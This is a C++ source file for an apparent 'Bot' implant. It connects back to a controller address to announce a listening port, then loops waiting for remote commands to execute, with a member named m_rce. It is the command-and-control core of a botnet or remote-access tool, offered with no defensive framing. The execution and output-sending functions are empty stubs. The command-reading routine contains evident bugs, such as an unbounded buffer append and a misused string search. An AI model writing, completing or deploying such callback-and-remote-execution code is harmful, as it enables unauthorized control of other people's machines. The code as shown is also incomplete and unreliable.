#include "Bot.hpp"
#include <TCPListener.hpp>
#include <arpa/inet.h>
#include <cstdio>
#include <iostream>
#include <netinet/in.h>
#include <random>
#include <string>
#include <sys/socket.h>
#include <system_error>
#include <unistd.h>

Bot::Bot(const sockaddr_in *cbaddr) {
    m_rce = -1;
    m_callback_addr = *cbaddr;
    m_tl = TCPListener();
}

Bot::~Bot() {
    m_tl.stop_listener();
}

int Bot::callback() {
    int res;
    int sockfd;
    std::string port = std::to_string(m_tl.get_port());

    std::cout << "INFO: Calling back to " << inet_ntoa(m_callback_addr.sin_addr) << ":" << ntohs(m_callback_addr.sin_port) << "\n";
    res = socket(AF_INET, SOCK_STREAM, 0);
    if (res == -1) {
        std::cout << "FAIL: Failed to create callback socket\n";
        return -1;
    }
    sockfd = res;

    res = connect(sockfd, (sockaddr *)&m_callback_addr,
                  (socklen_t)sizeof(m_callback_addr));
    if (res == -1) {
        std::cout << "FAIL: Failed to connect to callback listener\n";
        close(sockfd);
        return -1;
    }

    res = send(sockfd, port.c_str(), port.size(), 0);
    if (res == -1) {
        std::cout << "FAIL: Failed to send listener port\n";
        close(sockfd);
        return -1;
    }

    res = close(sockfd);
    std::cout << "SUCCESS: Called back\n";
    return 0;
}

void Bot::rce_loop() {
    std::string cmd;
    std::string output;

    while (true) {
        if (!is_connected()) {
            std::cout << "INFO: Waiting for connection...\n";
            sleep(10);
            continue;
        }

        std::cout << "INFO: Waiting for command...\n";
        cmd = get_command();
        std::cout.flush();
        std::cout << "COMMAND: " << cmd << "\n";
        output = execute_command(cmd);
        std::cout << "OUTPUT: " << output << "\n";
    }
}

std::string Bot::get_command() {
    ssize_t res;
    size_t total = 0;
    size_t buff_size = 4096;
    char buff[buff_size];
    std::string cmd;
    cmd.clear();

    while (true) {
        res = recv(m_rce, buff, buff_size, 0);
        if (res == -1) {
            break;
        }

        if (res == 0) {
            close(m_rce);
            m_rce = -1;
            break;
        }

        total += res;
        cmd.append(buff);
        if (cmd.find("\n", 0)) {
            break;
        }
    }

    cmd.pop_back();
    cmd.resize(total);
    return cmd;
}

std::string Bot::execute_command(std::string cmd) {}

int Bot::send_output(std::string output) {}

bool Bot::is_connected() {
    return m_rce > -1;
}